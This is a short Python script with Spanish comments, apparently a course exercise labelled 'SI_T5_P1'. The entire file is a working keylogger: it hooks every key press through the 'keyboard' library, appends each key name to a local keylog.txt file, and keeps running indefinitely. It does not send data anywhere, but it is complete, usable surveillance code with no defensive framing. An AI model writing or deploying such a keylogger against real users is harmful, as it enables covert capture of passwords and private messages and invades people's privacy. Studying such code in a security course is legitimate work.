# SI_T5_P1
import keyboard  


# Es la función que se encarga de guardar dichas teclas en el archivo.
def imprimir_tecla(key):

    with open("keylog.txt", "a") as file:

        if key.name == "space":
            file.write(" ")
        else:
            file.write(key.name)
# Acción para que se quede registrada la tecla pulsada.
keyboard.on_press(imprimir_tecla)
# Permite al keylogger seguir ejecutandose.
keyboard.wait()
